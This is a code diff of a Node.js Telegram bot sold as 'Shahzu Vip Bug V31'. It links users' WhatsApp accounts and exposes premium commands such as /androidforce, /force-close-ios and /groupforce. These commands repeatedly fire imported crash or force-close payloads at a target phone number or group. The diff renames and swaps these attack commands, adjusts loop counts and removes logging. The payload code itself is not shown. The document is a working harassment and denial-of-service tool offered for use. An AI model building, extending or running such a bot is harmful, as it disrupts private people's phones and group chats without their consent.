@@ -8,10 +8,8 @@ const path = require("path");
 const config = require("./config");
 
 let premiumUsers = require("./premium");
-const invisiblehard = require("./bugs/invisible");
-const { forceandro } = require("./bugs/fc-shahzu");
-const iosforce = require("./bugs/iosforce");
-const crashloop = require("./bugs/crashloop");
+const androidforce = require("./bugs/androidforce");
+const forcecloseIOS = require("./bugs/forceclose-ios");
 const groupforce = require("./bugs/groupforce");
 
 // ---------- helpers ----------
@@ -40,7 +38,6 @@ const isOwner = (id) => Number(id) === Number(config.ownerId);
 const isPremium = (id) => premiumUsers.includes(String(id));
 const isPrivate = (msg) => msg.chat.type === "private";
 
-// strict number validation — no +, no symbols, no spaces
 function isValidNumber(raw) {
     if (!raw) return false;
     const trimmed = String(raw).trim();
@@ -95,7 +92,7 @@ function getActiveSenders(userId) {
 // ---------- telegram bot ----------
 const bot = new TelegramBot(config.botToken, { polling: true });
 
-// ---------- WA connect for a user ----------
+// ---------- WA connect ----------
 async function connectUserWA(userId, number, chatId, isRetry = false) {
     const userSessionDir = path.join(config.sessionsDir, String(userId), number);
     fs.ensureDirSync(userSessionDir);
@@ -124,20 +121,15 @@ async function connectUserWA(userId, number, chatId, isRetry = false) {
         const { connection, lastDisconnect, qr } = update;
 
         if ((qr || connection === "connecting") && !pairingRequested) {
-            if (sock.authState.creds.registered) {
-                console.log(chalk.yellow(`[WA] already registered, skipping pair`));
-                return;
-            }
+            if (sock.authState.creds.registered) return;
 
             pairingRequested = true;
 
             setTimeout(async () => {
                 try {
-                    console.log(chalk.yellow(`[WA] requesting pairing code for ${number}...`));
+                    if (sock.authState.creds.registered) return;
                     const code = await sock.requestPairingCode(number, config.pairingCode);
                     const formatted = code.match(/.{1,4}/g)?.join("-") || code;
-
-                    console.log(chalk.green(`[WA] pairing code: ${formatted}`));
 
                     await bot.sendMessage(chatId,
 `╭━━━〔 PAIRING CODE 〕━━━╮
@@ -154,8 +146,7 @@ async function connectUserWA(userId, number, chatId, isRetry = false) {
 © Shahzu Vip Bug V31`
                     );
                 } catch (err) {
-                    console.log(chalk.red(`[WA] pair attempt failed: ${err.message}`));
-
+                    console.log("pair attempt failed:", err.message);
                     setTimeout(async () => {
                         try {
                             const code = await sock.requestPairingCode(number, config.pairingCode);
@@ -171,9 +162,8 @@ async function connectUserWA(userId, number, chatId, isRetry = false) {
 © Shahzu Vip Bug V31`
                             );
                         } catch (err2) {
-                            console.log(chalk.red(`[WA] pair retry failed: ${err2.message}`));
                             await bot.sendMessage(chatId,
-                                `❌ Pairing failed: ${err2.message}\n\nCheck:\n• WhatsApp on that number has < 4 linked devices\n• Number format: 923xxxxxxxxx (no +)\n• Try /delpair then /reqpair again`
+                                `❌ Pairing failed: ${err2.message}\n\nCheck:\n• Number format: 923xxxxxxxxx\n• WhatsApp has < 4 linked devices`
                             );
                         }
                     }, 5000);
@@ -194,27 +184,24 @@ async function connectUserWA(userId, number, chatId, isRetry = false) {
             }
 
             addUserSender(userId, number, sock);
-            console.log(chalk.green(`[WA] ✅ user=${userId} number=${number} connected`));
+            console.log(chalk.green(`[WA] connected user=${userId} number=${number}`));
             await bot.sendMessage(chatId, `✅ ${number} connected.`);
         }
 
         if (connection === "close") {
             const code = lastDisconnect?.error?.output?.statusCode;
-            console.log(chalk.yellow(`[WA] close code=${code} user=${userId} number=${number}`));
 
             if (code === 515) {
-                console.log(chalk.cyan(`[WA] 515 restartRequired — reconnecting immediately`));
                 setTimeout(() => connectUserWA(userId, number, chatId), 1000);
                 return;
             }
 
             if (code !== DisconnectReason.loggedOut && !fs.existsSync(path.join(userSessionDir, "creds.json"))) {
                 if (!isRetry) {
-                    console.log(chalk.yellow(`[WA] retrying pairing in 5s...`));
                     setTimeout(() => connectUserWA(userId, number, chatId, true), 5000);
                 } else {
                     await bot.sendMessage(chatId,
-                        `❌ Could not establish connection.\n\nTry /delpair ${number} and /reqpair ${number} again.`
+                        `❌ Could not connect.\n\nTry /delpair ${number} and /reqpair ${number}.`
                     );
                     fs.removeSync(userSessionDir);
                 }
@@ -222,12 +209,11 @@ async function connectUserWA(userId, number, chatId, isRetry = false) {
             }
 
             if (code !== DisconnectReason.loggedOut) {
-                console.log(chalk.yellow(`[WA] reconnecting in 3s...`));
                 setTimeout(() => connectUserWA(userId, number, chatId), 3000);
             } else {
                 removeUserSender(userId, number);
                 fs.removeSync(userSessionDir);
-                await bot.sendMessage(chatId, `❌ ${number} logged out. Session deleted.`);
+                await bot.sendMessage(chatId, `❌ ${number} logged out.`);
             }
         }
     });
@@ -235,7 +221,7 @@ async function connectUserWA(userId, number, chatId, isRetry = false) {
     return sock;
 }
 
-// ---------- auto-reconnect existing sessions ----------
+// ---------- auto-reconnect ----------
 async function loadAllSessions() {
     if (!fs.existsSync(config.sessionsDir)) return;
 
@@ -279,14 +265,12 @@ async function loadAllSessions() {
     }
 }
 
-// ---------- membership check ----------
+// ---------- membership ----------
 async function isMember(userId, chatId) {
     try {
         const member = await bot.getChatMember(chatId, userId);
-        console.log(chalk.cyan(`[member] user=${userId} chat=${chatId} status=${member.status}`));
         return ["creator", "administrator", "member"].includes(member.status);
-    } catch (err) {
-        console.log(chalk.red(`[member] FAIL user=${userId} chat=${chatId} err=${err.message}`));
+    } catch {
         return false;
     }
 }
@@ -294,9 +278,7 @@ async function isMember(userId, chatId) {
 async function checkBothJoined(userId) {
     const inChannel = await isMember(userId, config.channelId);
     const inGroup = await isMember(userId, config.groupId);
-    const allJoined = inChannel && inGroup;
-    console.log(chalk.yellow(`[check] user=${userId} inChannel=${inChannel} inGroup=${inGroup} allJoined=${allJoined}`));
-    return { inChannel, inGroup, allJoined };
+    return { inChannel, inGroup, allJoined: inChannel && inGroup };
 }
 
 async function sendMustJoin(chatId) {
@@ -364,7 +346,6 @@ async function sendMainMenu(chatId, userId) {
 // ---------- /start ----------
 bot.onText(/\/start/, async (msg) => {
     if (!isPrivate(msg)) return;
-
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
@@ -372,13 +353,11 @@ bot.onText(/\/start/, async (msg) => {
 
     const { allJoined } = await checkBothJoined(userId);
     if (!allJoined) return sendMustJoin(chatId);
-
     return sendMainMenu(chatId, userId);
 });
 
 bot.onText(/\/menu/, async (msg) => {
     if (!isPrivate(msg)) return;
-
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
@@ -388,7 +367,7 @@ bot.onText(/\/menu/, async (msg) => {
     return sendMainMenu(chatId, userId);
 });
 
-// ---------- callback query ----------
+// ---------- callback ----------
 bot.on("callback_query", async (q) => {
     const chatId = q.message.chat.id;
     const userId = q.from.id;
@@ -402,18 +381,14 @@ bot.on("callback_query", async (q) => {
             await bot.deleteMessage(chatId, msgId).catch(() => {});
             return sendMainMenu(chatId, userId);
         }
-
         const { inChannel, inGroup, allJoined } = await checkBothJoined(userId);
-
         if (allJoined) {
             await bot.deleteMessage(chatId, msgId).catch(() => {});
             return sendMainMenu(chatId, userId);
         }
-
         const missing = [];
         if (!inChannel) missing.push("📢 Channel");
         if (!inGroup) missing.push("👥 Group");
-
         return bot.answerCallbackQuery(q.id, {
             text: `❌ You haven't joined: ${missing.join(", ")}`,
             show_alert: true
@@ -425,17 +400,14 @@ bot.on("callback_query", async (q) => {
 `╭━━━〔 BUG MENU 〕━━━╮
 ┃
 ┣━ Bug Android
-┃➻ /delay-hard 92xxxxxxxx
-┃➻ /fc-shahzu 92xxxxxxxx
+┃➻ /androidforce 92xxxxxxxx
 ┃
 ┣━ Bug iOS
-┃➻ /iosforce 92xxxxxxxx
-┃➻ /crashloop 92xxxxxxxx
+┃➻ /force-close-ios 92xxxxxxxx
 ┃
 ┣━ Bug Group
-┃➻ /groupforce <groupid>
-┃➻ /listgc
 ┃➻ /groupid <link>
+┃➻ /groupforce <groupid>
 ┃
 ╰━━━━━━━━━━━━━━━━━━━━╯
 
@@ -492,32 +464,21 @@ bot.on("callback_query", async (q) => {
 // ---------- /reqpair ----------
 bot.onText(/\/reqpair(?:\s+(.+))?/, async (msg, match) => {
     if (!isPrivate(msg)) return;
-
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
-    if (!isOwner(userId) && !isPremium(userId)) {
-        return bot.sendMessage(chatId, ACCESS_DENIED);
-    }
-
+    if (!isOwner(userId) && !isPremium(userId)) return bot.sendMessage(chatId, ACCESS_DENIED);
     if (!isOwner(userId)) {
         const { allJoined } = await checkBothJoined(userId);
         if (!allJoined) return sendMustJoin(chatId);
     }
 
     const rawInput = (match[1] || "").trim();
-
     if (!isValidNumber(rawInput)) {
-        return bot.sendMessage(chatId,
-`Usage:
-/reqpair 92xxxxxxxx
-
-© Shahzu Vip Bug V31`
-        );
+        return bot.sendMessage(chatId, `Usage:\n/reqpair 92xxxxxxxx\n\n© Shahzu Vip Bug V31`);
     }
 
     const number = rawInput;
-
     const senders = getUserSenders(userId);
     if (senders.size >= 1) {
         const existing = [...senders.keys()][0];
@@ -532,15 +493,10 @@ Usage:
         );
     }
 
-    if (senders.has(number)) {
-        return bot.sendMessage(chatId, `ℹ️ ${number} already paired.`);
-    }
-
     try {
         await bot.sendMessage(chatId, `⏳ Requesting pairing code for ${number}...`);
         await connectUserWA(userId, number, chatId);
     } catch (err) {
-        console.log("reqpair error:", err.message);
         await bot.sendMessage(chatId, `❌ Failed: ${err.message}`);
     }
 });
@@ -548,23 +504,14 @@ Usage:
 // ---------- /delpair ----------
 bot.onText(/\/delpair(?:\s+(.+))?/, async (msg, match) => {
     if (!isPrivate(msg)) return;
-
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
-    if (!isOwner(userId) && !isPremium(userId)) {
-        return bot.sendMessage(chatId, ACCESS_DENIED);
-    }
+    if (!isOwner(userId) && !isPremium(userId)) return bot.sendMessage(chatId, ACCESS_DENIED);
 
     const rawInput = (match[1] || "").trim();
-
     if (!isValidNumber(rawInput)) {
-        return bot.sendMessage(chatId,
-`Usage:
-/delpair 92xxxxxxxx
-
-© Shahzu Vip Bug V31`
-        );
+        return bot.sendMessage(chatId, `Usage:\n/delpair 92xxxxxxxx\n\n© Shahzu Vip Bug V31`);
     }
 
     const number = rawInput;
@@ -587,25 +534,15 @@ bot.onText(/\/delpair(?:\s+(.+))?/, async (msg, match) => {
 // ---------- /addprem ----------
 bot.onText(/\/addprem(?:\s+(.+))?/, async (msg, match) => {
     if (!isPrivate(msg)) return;
-
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
     if (!isOwner(userId)) return bot.sendMessage(chatId, ACCESS_DENIED);
 
     const target = (match[1] || "").trim();
-    if (!target) {
-        return bot.sendMessage(chatId,
-`Usage:
-/addprem <ID>
+    if (!target) return bot.sendMessage(chatId, `Usage:\n/addprem <ID>\n\n© Shahzu Vip Bug V31`);
 
-© Shahzu Vip Bug V31`
-        );
-    }
-
-    if (premiumUsers.includes(target)) {
-        return bot.sendMessage(chatId, `ℹ️ ${target} already premium.`);
-    }
+    if (premiumUsers.includes(target)) return bot.sendMessage(chatId, `ℹ️ ${target} already premium.`);
 
     premiumUsers.push(target);
     saveArray(config.premiumFile, "premiumUsers", premiumUsers);
@@ -615,21 +552,13 @@ bot.onText(/\/addprem(?:\s+(.+))?/, async (msg, match) => {
 // ---------- /delprem ----------
 bot.onText(/\/delprem(?:\s+(.+))?/, async (msg, match) => {
     if (!isPrivate(msg)) return;
-
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
     if (!isOwner(userId)) return bot.sendMessage(chatId, ACCESS_DENIED);
 
     const target = (match[1] || "").trim();
-    if (!target) {
-        return bot.sendMessage(chatId,
-`Usage:
-/delprem <ID>
-
-© Shahzu Vip Bug V31`
-        );
-    }
+    if (!target) return bot.sendMessage(chatId, `Usage:\n/delprem <ID>\n\n© Shahzu Vip Bug V31`);
 
     const idx = premiumUsers.indexOf(target);
     if (idx === -1) return bot.sendMessage(chatId, `❌ ${target} not found.`);
@@ -639,31 +568,21 @@ bot.onText(/\/delprem(?:\s+(.+))?/, async (msg, match) => {
     await bot.sendMessage(chatId, `✅ ${target} removed from premium.`);
 });
 
-// ---------- /delay-hard ----------
-bot.onText(/\/delay-hard(?:\s+(.+))?/, async (msg, match) => {
+// ---------- /androidforce ----------
+bot.onText(/\/androidforce(?:\s+(.+))?/, async (msg, match) => {
     if (!isPrivate(msg)) return;
-
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
-    if (!isOwner(userId) && !isPremium(userId)) {
-        return bot.sendMessage(chatId, ACCESS_DENIED);
-    }
-
+    if (!isOwner(userId) && !isPremium(userId)) return bot.sendMessage(chatId, ACCESS_DENIED);
     if (!isOwner(userId)) {
         const { allJoined } = await checkBothJoined(userId);
         if (!allJoined) return sendMustJoin(chatId);
     }
 
     const rawInput = (match[1] || "").trim();
-
     if (!isValidNumber(rawInput)) {
-        return bot.sendMessage(chatId,
-`Usage:
-/delay-hard 92xxxxxxxx
-
-© Shahzu Vip Bug V31`
-        );
+        return bot.sendMessage(chatId, `Usage:\n/androidforce 92xxxxxxxx\n\n© Shahzu Vip Bug V31`);
     }
 
     const number = rawInput;
@@ -674,55 +593,38 @@ bot.onText(/\/delay-hard(?:\s+(.+))?/, async (msg, match) => {
     const senderList = active.map(s => s.user.id.split(":")[0].split("@")[0]).join(", ");
 
     for (const sock of active) {
-        for (let i = 0; i < 30; i++) {
-            try {
-                await invisiblehard(sock, target);
-                await invisiblehard(sock, target);
-                await invisiblehard(sock, target);
-                await invisiblehard(sock, target);
-            } catch {}
+        for (let i = 0; i < 15; i++) {
+            try { await androidforce(sock, target); } catch {}
         }
     }
 
-    const notification =
+    await bot.sendPhoto(chatId, config.photoUrl, {
+        caption:
 `┌──────┤ NOTIFICATION ├──────┐
 │ Sent bug to 👇🏻
 │ Target: ${number}
 │ From: ${senderList}
 └────────────────────────┘
 
-© Shahzu Vip Bug V31`;
-
-    await bot.sendPhoto(chatId, config.photoUrl, {
-        caption: notification
+© Shahzu Vip Bug V31`
     });
 });
 
-// ---------- /fc-shahzu ----------
-bot.onText(/\/fc-shahzu(?:\s+(.+))?/, async (msg, match) => {
+// ---------- /force-close-ios ----------
+bot.onText(/\/force-close-ios(?:\s+(.+))?/, async (msg, match) => {
     if (!isPrivate(msg)) return;
-
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
-    if (!isOwner(userId) && !isPremium(userId)) {
-        return bot.sendMessage(chatId, ACCESS_DENIED);
-    }
-
+    if (!isOwner(userId) && !isPremium(userId)) return bot.sendMessage(chatId, ACCESS_DENIED);
     if (!isOwner(userId)) {
         const { allJoined } = await checkBothJoined(userId);
         if (!allJoined) return sendMustJoin(chatId);
     }
 
     const rawInput = (match[1] || "").trim();
-
     if (!isValidNumber(rawInput)) {
-        return bot.sendMessage(chatId,
-`Usage:
-/fc-shahzu 92xxxxxxxx
-
-© Shahzu Vip Bug V31`
-        );
+        return bot.sendMessage(chatId, `Usage:\n/force-close-ios 92xxxxxxxx\n\n© Shahzu Vip Bug V31`);
     }
 
     const number = rawInput;
@@ -733,154 +635,30 @@ bot.onText(/\/fc-shahzu(?:\s+(.+))?/, async (msg, match) => {
     const senderList = active.map(s => s.user.id.split(":")[0].split("@")[0]).join(", ");
 
     for (const sock of active) {
-        for (let i = 0; i < 30; i++) {
-            try {
-                await forceandro(sock, target);
-                await forceandro(sock, target);
-                await forceandro(sock, target);
-                await forceandro(sock, target);
-            } catch {}
+        for (let i = 0; i < 15; i++) {
+            try { await forcecloseIOS(sock, target); } catch {}
         }
     }
 
-    const notification =
+    await bot.sendPhoto(chatId, config.photoUrl, {
+        caption:
 `┌──────┤ NOTIFICATION ├──────┐
 │ Sent bug to 👇🏻
 │ Target: ${number}
 │ From: ${senderList}
 └────────────────────────┘
-
-© Shahzu Vip Bug V31`;
-
-    await bot.sendPhoto(chatId, config.photoUrl, {
-        caption: notification
-    });
-});
-
-// ---------- /iosforce ----------
-bot.onText(/\/iosforce(?:\s+(.+))?/, async (msg, match) => {
-    if (!isPrivate(msg)) return;
-
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-
-    if (!isOwner(userId) && !isPremium(userId)) {
-        return bot.sendMessage(chatId, ACCESS_DENIED);
-    }
-
-    if (!isOwner(userId)) {
-        const { allJoined } = await checkBothJoined(userId);
-        if (!allJoined) return sendMustJoin(chatId);
-    }
-
-    const rawInput = (match[1] || "").trim();
-
-    if (!isValidNumber(rawInput)) {
-        return bot.sendMessage(chatId,
-`Usage:
-/iosforce 92xxxxxxxx
 
 © Shahzu Vip Bug V31`
-        );
-    }
-
-    const number = rawInput;
-    const active = getActiveSenders(userId);
-    if (active.length === 0) return bot.sendMessage(chatId, SESSION_INACTIVE);
-
-    const target = number + "@s.whatsapp.net";
-    const senderList = active.map(s => s.user.id.split(":")[0].split("@")[0]).join(", ");
-
-    for (const sock of active) {
-        for (let i = 0; i < 30; i++) {
-            try {
-                await iosforce(sock, target);
-                await iosforce(sock, target);
-                await iosforce(sock, target);
-                await iosforce(sock, target);
-            } catch {}
-        }
-    }
-
-    const notification =
-`┌──────┤ NOTIFICATION ├──────┐
-│ Sent bug to 👇🏻
-│ Target: ${number}
-│ From: ${senderList}
-└────────────────────────┘
-
-© Shahzu Vip Bug V31`;
-
-    await bot.sendPhoto(chatId, config.photoUrl, {
-        caption: notification
-    });
-});
-
-// ---------- /crashloop ----------
-bot.onText(/\/crashloop(?:\s+(.+))?/, async (msg, match) => {
-    if (!isPrivate(msg)) return;
-
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-
-    if (!isOwner(userId) && !isPremium(userId)) {
-        return bot.sendMessage(chatId, ACCESS_DENIED);
-    }
-
-    if (!isOwner(userId)) {
-        const { allJoined } = await checkBothJoined(userId);
-        if (!allJoined) return sendMustJoin(chatId);
-    }
-
-    const rawInput = (match[1] || "").trim();
-
-    if (!isValidNumber(rawInput)) {
-        return bot.sendMessage(chatId,
-`Usage:
-/crashloop 92xxxxxxxx
-
-© Shahzu Vip Bug V31`
-        );
-    }
-
-    const number = rawInput;
-    const active = getActiveSenders(userId);
-    if (active.length === 0) return bot.sendMessage(chatId, SESSION_INACTIVE);
-
-    const target = number + "@s.whatsapp.net";
-    const senderList = active.map(s => s.user.id.split(":")[0].split("@")[0]).join(", ");
-
-    for (const sock of active) {
-        for (let i = 0; i < 5; i++) {
-            try { await crashloop(sock, target); } catch {}
-        }
-    }
-
-    const notification =
-`┌──────┤ NOTIFICATION ├──────┐
-│ Sent bug to 👇🏻
-│ Target: ${number}
-│ From: ${senderList}
-└────────────────────────┘
-
-© Shahzu Vip Bug V31`;
-
-    await bot.sendPhoto(chatId, config.photoUrl, {
-        caption: notification
     });
 });
 
 // ---------- /groupid ----------
 bot.onText(/\/groupid(?:\s+(.+))?/, async (msg, match) => {
     if (!isPrivate(msg)) return;
-
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
-    if (!isOwner(userId) && !isPremium(userId)) {
-        return bot.sendMessage(chatId, ACCESS_DENIED);
-    }
-
+    if (!isOwner(userId) && !isPremium(userId)) return bot.sendMessage(chatId, ACCESS_DENIED);
     if (!isOwner(userId)) {
         const { allJoined } = await checkBothJoined(userId);
         if (!allJoined) return sendMustJoin(chatId);
@@ -929,91 +707,13 @@ Example:
     );
 });
 
-// ---------- /listgc ----------
-bot.onText(/\/listgc/, async (msg) => {
-    if (!isPrivate(msg)) return;
-
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-
-    if (!isOwner(userId) && !isPremium(userId)) {
-        return bot.sendMessage(chatId, ACCESS_DENIED);
-    }
-
-    if (!isOwner(userId)) {
-        const { allJoined } = await checkBothJoined(userId);
-        if (!allJoined) return sendMustJoin(chatId);
-    }
-
-    const active = getActiveSenders(userId);
-    if (active.length === 0) return bot.sendMessage(chatId, SESSION_INACTIVE);
-
-    const sock = active[0];
-
-    let groups;
-    try {
-        groups = await sock.groupFetchAllParticipating();
-    } catch (err) {
-        return bot.sendMessage(chatId, `❌ Failed: ${err.message}`);
-    }
-
-    const groupList = Object.values(groups);
-
-    if (groupList.length === 0) {
-        return bot.sendMessage(chatId, "ℹ️ No groups found on this sender.");
-    }
-
-    const senderNumber = sock.user.id.split(":")[0].split("@")[0];
-
-    let text = `┌───┤ GROUP LIST ├───┐\n`;
-    text += `│ From: ${senderNumber}\n`;
-    text += `│ Total: ${groupList.length}\n`;
-    text += `└────────────────────┘\n\n`;
-
-    groupList.forEach((g, i) => {
-        const name = g.subject || "Unnamed";
-        const jid = g.id;
-        const members = g.participants?.length || 0;
-
-        text += `${i + 1}. ${name}\n`;
-        text += `   └ ${jid}\n`;
-        text += `   └ 👥 ${members} members\n\n`;
-    });
-
-    text += `© Shahzu Vip Bug V31`;
-
-    const MAX = 4000;
-    if (text.length <= MAX) {
-        await bot.sendMessage(chatId, text);
-    } else {
-        const chunks = [];
-        let current = "";
-        for (const line of text.split("\n")) {
-            if ((current + line + "\n").length > MAX) {
-                chunks.push(current);
-                current = "";
-            }
-            current += line + "\n";
-        }
-        if (current) chunks.push(current);
-
-        for (const chunk of chunks) {
-            await bot.sendMessage(chatId, chunk);
-        }
-    }
-});
-
 // ---------- /groupforce ----------
 bot.onText(/\/groupforce(?:\s+(.+))?/, async (msg, match) => {
     if (!isPrivate(msg)) return;
-
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
-    if (!isOwner(userId) && !isPremium(userId)) {
-        return bot.sendMessage(chatId, ACCESS_DENIED);
-    }
-
+    if (!isOwner(userId) && !isPremium(userId)) return bot.sendMessage(chatId, ACCESS_DENIED);
     if (!isOwner(userId)) {
         const { allJoined } = await checkBothJoined(userId);
         if (!allJoined) return sendMustJoin(chatId);
@@ -1046,7 +746,7 @@ Get group ID first:
             const meta = await sock.groupMetadata(groupJid);
             totalParticipants = meta.participants.length;
 
-            for (let i = 0; i < 5; i++) {
+            for (let i = 0; i < 10; i++) {
                 try { await groupforce(sock, groupJid); } catch (err) {
                     console.log("groupforce cycle err:", err.message);
                 }
@@ -1059,7 +759,8 @@ Get group ID first:
 
     const senderList = active.map(s => s.user.id.split(":")[0].split("@")[0]).join(", ");
 
-    const notification =
+    await bot.sendPhoto(chatId, config.photoUrl, {
+        caption:
 `┌──────┤ NOTIFICATION ├──────┐
 │ Sent bug to 👇🏻
 │ Group: ${groupJid}
@@ -1067,10 +768,7 @@ Get group ID first:
 │ From: ${senderList}
 └────────────────────────┘
 
-© Shahzu Vip Bug V31`;
-
-    await bot.sendPhoto(chatId, config.photoUrl, {
-        caption: notification
+© Shahzu Vip Bug V31`
     });
 });
 
